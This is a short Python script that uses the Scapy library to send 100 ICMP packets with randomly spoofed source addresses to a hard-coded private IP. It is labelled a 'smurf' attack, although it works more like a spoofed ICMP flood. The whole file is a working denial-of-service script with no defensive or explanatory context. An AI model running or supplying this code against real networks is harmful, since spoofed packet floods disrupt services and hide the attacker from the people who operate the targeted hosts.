from scapy.all import *
from scapy.all import IP, ICMP


def smurf_packet(target_ip):
    s_addr = RandIP()   
    send(IP(src=s_addr, dst=target_ip) / ICMP()/"surfing dolphine", count=100)

if __name__ == '__main__':
    target =  "192.168.0.150"
    smurf_packet(target)